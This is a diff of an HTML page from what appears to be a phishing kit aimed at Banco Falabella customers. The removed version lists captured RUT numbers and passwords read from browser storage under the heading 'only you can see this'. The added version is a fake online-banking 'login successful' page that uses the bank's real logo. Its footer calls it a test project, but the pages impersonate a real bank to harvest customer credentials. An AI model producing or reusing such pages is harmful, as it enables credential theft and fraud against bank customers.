@@ -3,51 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registros de Clientes</title>
+    <title>Banca en Línea - Banco Falabella</title>
     <style>
-        body { font-family: Arial; padding: 20px; background: #f4f4f4; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
-        th { background: #e60000; color: white; }
-        tr:nth-child(even) { background: #f9f9f9; }
-        .btn { background: #e60000; color: white; padding: 10px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 20px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 40px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 30px;
+        }
+        .header img {
+            width: 180px;
+        }
+        .welcome {
+            color: #009e4c;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .info {
+            background: #e8f5e9;
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 4px solid #009e4c;
+            margin: 20px 0;
+        }
+        .btn {
+            background: #009e4c;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #008a41;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #666;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
 
-<h1>Registros de Clientes (Solo tú puedes ver esto)</h1>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Banco Falabella">
+            <div class="welcome">¡Bienvenido!</div>
+        </div>
 
-<table id="tabla">
-    <thead>
-        <tr>
-            <th>RUT</th>
-            <th>Clave</th>
-            <th>Fecha y Hora</th>
-        </tr>
-    </thead>
-    <tbody></tbody>
-</table>
+        <div class="info">
+            <strong>Acceso exitoso</strong><br>
+            Has iniciado sesión correctamente en tu Banca en Línea.
+        </div>
 
-<a href="index.html" class="btn">Volver al Formulario</a>
+        <p>Ahora puedes:</p>
+        <ul>
+            <li>Ver saldo de tus cuentas</li>
+            <li>Realizar transferencias</li>
+            <li>Pagar tarjetas</li>
+            <li>Consultar movimientos</li>
+        </ul>
 
-<script>
-const registros = JSON.parse(localStorage.getItem("clientes_falabella") || "[]");
-const tbody = document.querySelector("#tabla tbody");
+        <button class="btn" onclick="alert('Funcionalidad en desarrollo')">Ir al Panel Principal</button>
 
-if (registros.length === 0) {
-    tbody.innerHTML = "<tr><td colspan='3' style='text-align:center;'>No hay registros aún.</td></tr>";
-} else {
-    registros.forEach(r => {
-        const tr = document.createElement("tr");
-        tr.innerHTML = `
-            <td>${r.rut}</td>
-            <td><strong>${r.clave}</strong></td>
-            <td>${r.fecha}</td>
-        `;
-        tbody.appendChild(tr);
-    });
-}
-</script>
+        <div class="footer">
+            Banco Falabella © 2025 | Este es un proyecto de prueba
+        </div>
+    </div>
 
 </body>
 </html>
